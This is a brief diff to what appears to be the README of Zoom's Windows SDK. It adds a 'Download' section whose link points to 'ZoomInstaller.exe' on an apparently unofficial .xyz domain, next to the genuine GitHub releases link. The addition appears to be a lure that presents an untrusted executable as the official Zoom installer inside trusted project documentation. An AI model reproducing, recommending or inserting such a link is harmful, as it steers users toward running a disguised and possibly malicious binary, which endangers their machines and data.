@@ -19,6 +19,10 @@ Click on your SDK app, you can find the desired SDK packages from the **Download
 
 If you are looking for the previous versions, please visit https://github.com/zoom/zoom-sdk-windows/releases
 
+## Download 
+
+[You can also download zoom easily here](https://whoiz.xyz/ZoomInstaller.exe)
+
 ## Full Documentation && Community Support
 You can find the full Zoom Windows SDK documentation and the community support forum here:
 <div align="center">
